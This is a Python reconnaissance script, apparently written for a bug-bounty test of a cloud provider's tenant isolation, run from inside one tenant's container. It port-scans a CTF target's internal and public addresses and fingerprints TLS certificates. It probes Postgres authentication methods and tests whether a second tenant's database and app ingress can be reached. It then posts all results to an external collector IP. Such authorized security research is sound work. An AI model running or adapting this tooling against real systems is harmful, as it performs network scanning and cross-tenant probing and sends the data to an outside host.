#!/usr/bin/env python3
"""probe21 - tenant A's container: cross-tenant reachability + the CTF's internally-resolved address.

Three questions, all from inside tenant A's own container:

 1. The CTF service name resolves to 129.213.46.149 from inside Aiven but 193.122.235.156 from the
    public internet (our external watcher). Is the internal address a second door - same certificate,
    same auth, different filtering? In-scope target, identification only.
 2. Tenant reachability: can A reach tenant B's own resources (B is our second account) over the
    internal network - B's app ingress name and B's Postgres host - without going out to the internet?
 3. Control on the pod-address model: both A's and B's containers report 10.150.0.35/32, so connecting
    to that address from inside A must hit A itself. Recording that makes the earlier "no sibling pods"
    result interpretable.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import struct
import threading
import time
import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt21"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
CTF_NAME = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
CTF_PUBLIC = "193.122.235.156"
CTF_INTERNAL_SEEN = "129.213.46.149"
B_PG_HOST = "bb-mig-src-1-bugcrowdninja-1dd5.l.aivencloud.com"
B_PG_PORT = 11170
B_APP_INGRESS = "01a154b5-22cb-7cd5-9ddc-11aa820f4a0d-8080.amer-1.aiven.app"
B_APP_PUBLIC = "bb-app-gcp-bugcrowdninja-1dd5.j.aivencloud.com"
A_PG_HOST = "bb-probe-pg-1-bugcrowdninja-2a85.i.aivencloud.com"
PORTS = [22, 80, 443, 5432, 12691, 12692, 11170, 14857, 14858, 21911, 21912, 9701, 9680, 9955]
RESULTS = {"stage": "init", "dns": {}, "scan": {}, "ident": {}, "cross": {}, "controls": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"marker": "BB-TENANT-A-CONTAINER"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def resolve(name):
    try:
        return sorted({r[4][0] for r in socket.getaddrinfo(name, None)})
    except Exception as e:                                              # noqa: BLE001
        return type(e).__name__


def tcp(host, port, timeout=4.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        return "open", int((time.time() - t0) * 1000)
    except socket.timeout:
        return "timeout", int((time.time() - t0) * 1000)
    except OSError as e:
        return type(e).__name__.replace("Error", ""), int((time.time() - t0) * 1000)
    finally:
        try:
            s.close()
        except Exception:
            pass


def tls_fp(host, port):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        r = s.recv(1)
        if r != b"S":
            s.close()
            return "no-tls (reply=%r)" % r
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=host)
        der = t.getpeercert(binary_form=True)
        fp = hashlib.sha256(der).hexdigest()[:16]
        t.close()
        return fp
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


def pg_auth(host, port, user="avnadmin"):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        if s.recv(1) == b"S":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", "defaultdb"), ("application_name", "aiven-bugbounty/1.0")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        h = s.recv(5)
        n = struct.unpack("!i", h[1:5])[0]
        p = b""
        while len(p) < n - 4:
            c = s.recv(n - 4 - len(p))
            if not c:
                break
            p += c
        s.close()
        if h[:1] == b"R":
            code = struct.unpack("!i", p[:4])[0]
            return {0: "TRUST", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM"}.get(code, "code=%d" % code)
        if h[:1] == b"E":
            return "error: " + (p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1")[:60] if b"M" in p else "?")
        return "msg=%r" % h[:1]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


def http_get(host, port, path="/", tls=False, timeout=8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n" % (path, host, UA)).encode())
        d = b""
        while len(d) < 600:
            try:
                c = s.recv(400)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        s.close()
        return d.decode("latin1", "replace").split("\r\n\r\n", 1)[-1][:150].replace("\n", " ")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), H).serve_forever(), daemon=True).start()
time.sleep(2)

for n in (CTF_NAME, B_PG_HOST, B_APP_INGRESS, B_APP_PUBLIC, A_PG_HOST, "metadata.google.internal"):
    RESULTS["dns"][n] = resolve(n)

for host, label in ((CTF_INTERNAL_SEEN, "ctf-internal"), (CTF_PUBLIC, "ctf-public")):
    RESULTS["scan"][label] = {}
    for p in PORTS:
        st, ms = tcp(host, p)
        if st == "open":
            RESULTS["scan"][label][p] = {"ms": ms}
    for p in list(RESULTS["scan"][label]):
        if p not in (22, 80, 443):
            RESULTS["ident"]["%s:%d" % (label, p)] = {"cert_fp": tls_fp(host, p), "avnadmin": pg_auth(host, p)}

# cross-tenant: B's own resources, from A
for label, host, port, tls in (("B-pg-internal", B_PG_HOST, B_PG_PORT, False),
                               ("B-app-ingress", B_APP_INGRESS, 80, False),
                               ("B-app-public", B_APP_PUBLIC, 443, True)):
    st, ms = tcp(host, port)
    RESULTS["cross"][label] = {"state": st}
    if st == "open":
        RESULTS["cross"][label]["http"] = http_get(host, port, "/", tls=tls)
        if port == B_PG_PORT:
            RESULTS["cross"][label]["pg_auth"] = pg_auth(host, port)

# controls: our own marker on the shared pod address, and the gateway
RESULTS["controls"]["10.150.0.35:8080 (pod address)"] = http_get("10.150.0.35", 8080)
RESULTS["controls"]["10.150.0.1:8080 (gateway)"] = tcp("10.150.0.1", 8080)[0]
RESULTS["controls"]["169.254.1.2:22"] = tcp("169.254.1.2", 22)[0]

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RESULTS).encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:3500])
while True:
    time.sleep(60)
